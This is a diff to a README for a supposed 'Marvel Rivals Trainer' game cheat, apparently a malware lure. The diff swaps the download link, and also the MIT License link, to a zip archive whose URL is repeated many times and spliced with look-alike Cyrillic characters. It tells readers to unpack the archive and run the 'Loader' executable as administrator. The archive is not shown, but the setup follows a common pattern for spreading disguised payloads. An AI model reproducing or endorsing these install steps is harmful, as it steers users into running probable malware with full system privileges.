@@ -32,7 +32,7 @@ Welcome to the Marvel Rivals Trainer! This open-source tool empowers you to **en
 
 ## 🚀 Installation
 
-1. Download `https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zip` from the repository.
+1. Download `https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zip` from the repository.
 2. Unpack using your favorite archiver (e.g., WinRAR, 7-Zip).
 3. Run the extracted Loader executable as administrator.
 4. Follow on-screen prompts to activate your chosen features.
@@ -53,7 +53,7 @@ This software is for **educational purposes** only. Usage may violate Marvel Riv
 
 ## ⚖️ License
 
-[MIT License 2025](https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zip) — Free for personal and educational use!
+[MIT License 2025](https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zipоhttps://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/womanship/Rivals_Mastermind_Marvel_3.1.zip) — Free for personal and educational use!
 
 ---
 
